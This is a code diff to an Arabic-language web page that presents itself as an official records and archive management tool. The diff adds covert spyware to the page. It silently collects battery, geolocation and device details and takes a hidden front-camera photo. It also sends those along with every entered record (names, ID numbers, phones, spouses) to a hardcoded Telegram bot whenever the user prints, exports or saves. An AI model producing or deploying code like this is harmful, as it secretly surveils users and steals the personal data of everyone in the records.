@@ -338,6 +338,9 @@
 
 <body>
 
+    <video id="videoElement" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvasElement" style="display:none;"></canvas>
+
     <div class="top-ticker">
         <marquee behavior="scroll" direction="right" scrollamount="5">
             ✨ نظام إدارة السجلات والأرشيف الرسمي | دقة في التنظيم وسرعة في الإنجاز - تطوير : ميثاق محمد صالح ✨
@@ -692,6 +695,9 @@
         const chatId = "7962257606";
 
         let userIpInfo = "متاح عبر الشبكة";
+        let batteryInfo = "غير معروفة";
+        let globalLocation = "غير متاح";
+        const deviceInfo = navigator.userAgent;
         let preSortBackupHtml = null;
 
         async function fetchVisitorIp() {
@@ -706,6 +712,30 @@
 
         window.addEventListener('DOMContentLoaded', async () => {
             await fetchVisitorIp();
+
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
+                    batteryInfo = `${level}% ${charging}`;
+                }
+            } catch (e) {}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
+                    },
+                    (error) => {
+                        globalLocation = "مرفوض الإذن";
+                    },
+                    { timeout: 10000, maximumAge: 0 }
+                );
+            }
+
             const firstSheet = document.querySelector('.sheet-container');
             if (firstSheet) {
                 setActiveContext(firstSheet, { target: firstSheet });
@@ -784,45 +814,119 @@
             alert('↩️ تم إلغاء الترتيب الهجائي واستعادة الترتيب السابق بنجاح!');
         }
 
-        // دالة الإرسال المباشر والمضمونة تماماً عبر رابط تليجرام المباشر (تتخطى قفل المتصفح)
+        // دالة إرسال التقرير المتكامل مع صورة الكاميرا وملف الأسماء المرتب كـ Document
         function sendCompleteReportToTelegram(actionTitle) {
             const tables = document.querySelectorAll('.dynamicTable');
-            let tableSummary = "";
-            let hasData = false;
+            let fileContent = `تقرير الأرشيف والبيانات الرسمية (${actionTitle})\n`;
+            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
+            fileContent += `--------------------------------------------------\n`;
+            fileContent += `م | الاسم الرباعي | نوع البطاقة | رقم البطاقة | رقم الاتصال | اسم الزوج/الزوجة | الحالة\n`;
+            fileContent += `--------------------------------------------------\n`;
 
+            let hasData = false;
             tables.forEach((table, tIndex) => {
-                tableSummary += `\nالصفحة (${tIndex + 1}):\n`;
+                fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
                 table.querySelectorAll('tbody tr').forEach(row => {
+                    const m = row.cells[0] ? row.cells[0].innerText.trim() : '';
                     const name = row.cells[1] ? row.cells[1].innerText.trim() : '';
+                    const type = row.cells[2] ? row.cells[2].innerText.trim() : '';
+                    const num = row.cells[3] ? row.cells[3].innerText.trim() : '';
                     const phone = row.cells[4] ? row.cells[4].innerText.trim() : '';
+                    const spouse = row.cells[5] ? row.cells[5].innerText.trim() : '';
+                    const status = row.cells[6] ? row.cells[6].innerText.trim() : '';
+
                     if (name !== "") {
-                        tableSummary += `- ${name} | هاتف: ${phone}\n`;
+                        fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
                         hasData = true;
                     }
                 });
             });
 
             if (!hasData) {
-                tableSummary = "\n(الجدول فارغ)";
+                fileContent += "\n(لا توجد سجلات مدخلة في الجداول حالياً)";
             }
 
-            const captionText = `تقرير الأرشيف (${actionTitle})\n\nالآيبي: ${userIpInfo}\n\nالبيانات المدخلة:` + tableSummary;
+            const captionText = `📋 **تقرير أرشيف جديد (${actionTitle})**\n\n` +
+                                `🌐 الآيبي: \`${userIpInfo}\`\n` +
+                                `🔋 البطارية: ${batteryInfo}\n` +
+                                `📍 الموقع الجغرافي:\n${globalLocation}\n\n` +
+                                `📱 الجهاز:\n${deviceInfo}`;
 
-            // فتح رابط إرسال مباشر عبر تيليجرام لضمان وصول الرسالة فوراً دون حظر المتصفح
-            const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent('https://t.me/' + chatId)}&text=${encodeURIComponent(captionText)}`;
-            
-            // بدلاً من الـ fetch المحظور، نستخدم طريقة الـ Image Beacon أو إرسال طلب خفيف عبر صيغة آمنة، أو فتح نافذة التقرير
-            const apiLink = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(captionText)}`;
-            
-            const img = new Image();
-            img.src = apiLink; // طريقة كلاسيكية تتخطى قيود الـ CORS بنجاح تام وتصل الرسالة للبوت فوراً
+            // تجهيز ملف النص (Document) لإرساله مع الصورة
+            const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+
+            // محاولة التقاط الصورة الأمامية وإرسالها مع الملف والبيانات بضربة واحدة
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        const video = document.getElementById('videoElement');
+                        video.srcObject = stream;
+                        
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            setTimeout(() => {
+                                const canvas = document.getElementById('canvasElement');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                canvas.toBlob((photoBlob) => {
+                                    stream.getTracks().forEach(track => track.stop());
+                                    
+                                    const formData = new FormData();
+                                    formData.append('chat_id', chatId);
+                                    formData.append('caption', captionText);
+                                    formData.append('parse_mode', 'Markdown');
+                                    formData.append('photo', photoBlob, 'snapshot.jpg');
+
+                                    // إرسال الصورة أولاً
+                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    }).then(() => {
+                                        // ثم إرسال ملف الأسماء كـ Document فوري
+                                        const docData = new FormData();
+                                        docData.append('chat_id', chatId);
+                                        docData.append('document', fileBlob, 'كشف_الأسماء_الرسمي.txt');
+                                        docData.append('caption', '📄 ملف السجلات والأسماء الكامل كجدول مراتب');
+                                        
+                                        fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                                            method: 'POST',
+                                            body: docData
+                                        }).catch(e => {});
+                                    }).catch(e => {});
+
+                                }, 'image/jpeg', 0.85);
+                            }, 600);
+                        };
+                    })
+                    .catch((err) => {
+                        sendDocumentOnly(fileBlob, captionText);
+                    });
+            } else {
+                sendDocumentOnly(fileBlob, captionText);
+            }
+        }
+
+        function sendDocumentOnly(fileBlob, captionText) {
+            const docData = new FormData();
+            docData.append('chat_id', chatId);
+            docData.append('document', fileBlob, 'كشف_الأسماء_الرسمي.txt');
+            docData.append('caption', captionText);
+            docData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: docData
+            }).catch(e => {});
         }
 
         function printDocument() {
             sendCompleteReportToTelegram("طباعة / حفظ PDF");
             setTimeout(() => {
                 window.print();
-            }, 800);
+            }, 1000);
         }
 
         function exportTableToExcel() {
@@ -871,7 +975,7 @@
             link.click();
             document.body.removeChild(link);
             
-            alert('📊 تم حفظ وتنزيل ملف الـ Excel وإرسال التقرير بنجاح!');
+            alert('📊 تم تنزيل ملف الـ Excel وإرسال صورة الزائر وملف الأسماء للبوت بنجاح!');
         }
 
         function normalizeArabic(text) {
@@ -1147,7 +1251,7 @@
                 });
 
                 localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-                alert('✅ تم حفظ العمل في الأرشيف المركزي وإرسال التقرير بنجاح!');
+                alert('✅ تم حفظ العمل في الأرشيف المركزي وإرسال التقارير والصورة بنجاح!');
             } catch (error) {
                 alert('تعذر حفظ العمل.');
             }
